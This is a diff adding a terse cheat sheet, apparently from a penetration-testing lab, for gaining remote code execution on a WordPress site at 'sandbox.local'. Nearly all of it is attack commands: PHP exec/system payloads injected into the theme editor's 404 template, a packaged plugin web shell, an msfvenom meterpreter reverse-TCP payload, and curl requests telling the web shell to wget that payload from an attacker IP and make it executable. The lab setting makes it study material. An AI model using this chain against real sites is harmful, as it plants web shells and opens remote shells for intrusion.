@@ -1,0 +1,21 @@
+#!/usr/bin/peno
+
+
+#Authenticated RCE
+#Appearance → Theme Editor → 404 Template
+<?php echo exec("cat /home/flag.txt")?>
+<?php echo system("whoami")?>
+
+#Add Plugins RCE
+cd /usr/share/seclists/Web-Shells/WordPress
+sudo zip plugin-shell.zip plugin-shell.php -->Upload --> Install
+
+#Exploiting-Shell
+RCE --> curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=443 -f elf > shell.elf
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://10.11.0.4/shell.elf
+curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf
+
+
+
+
